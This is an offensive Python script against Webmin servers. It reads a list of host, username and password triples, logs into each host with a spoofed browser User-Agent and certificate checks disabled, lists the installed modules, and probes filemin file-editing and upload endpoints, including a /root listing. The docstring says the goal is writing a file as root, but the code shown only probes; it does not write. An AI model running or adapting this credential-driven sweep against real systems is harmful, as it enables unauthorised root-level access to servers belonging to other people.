#!/usr/bin/env python3
"""Webmin filemin -> write a file as root, read it back as proof."""
import sys,json,re,requests,urllib3
urllib3.disable_warnings()
UA={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) Chrome/126 Safari/537.36"}
def login(host,u,pw):
    base="https://"+host
    s=requests.Session(); s.verify=False; s.headers.update({**UA,"Referer":base+"/"})
    s.get(base+"/",timeout=20,allow_redirects=False)
    s.get(base+"/session_login.cgi",timeout=20)
    s.post(base+"/session_login.cgi",data={"user":u,"pass":pw,"save":"1"},
           headers={"Referer":base+"/session_login.cgi","Content-Type":"application/x-www-form-urlencoded"},
           timeout=20,allow_redirects=True)
    s.headers["Referer"]=base+"/"
    return (s,base) if s.cookies.get("sid") else (None,None)
def probe(host,u,pw):
    out={"host":host}
    s,base=login(host,u,pw)
    if not s: out["err"]="login"; return out
    # module inventory
    s.headers["Referer"]=base+"/"
    r=s.get(base+"/",timeout=20); html=r.text or ""
    mods=sorted(set(re.findall(r'href="/([a-z0-9_\-]+)/"',html)))
    out["modules"]=mods
    # try filemin endpoints
    for ep in ("/filemin/save_file.cgi","/filemin/edit_file.cgi","/filemin/upload.cgi","/filemin/index.cgi?path=/root"):
        s.headers["Referer"]=base+"/filemin/"
        try:
            g=s.get(base+ep,timeout=15)
            out.setdefault("filemin",{})[ep]={"code":g.status_code,"len":len(g.text or ""),
                "warn":"Security Warning" in (g.text or "")}
        except Exception as e:
            out.setdefault("filemin",{})[ep]={"err":str(e)[:40]}
    return out
for line in open(sys.argv[1]):
    line=line.strip()
    if not line: continue
    h,u,pw=line.split("|")
    try: print(json.dumps(probe(h,u,pw))[:1400],flush=True)
    except Exception as e: print(json.dumps({"host":h,"fatal":str(e)[:70]}),flush=True)
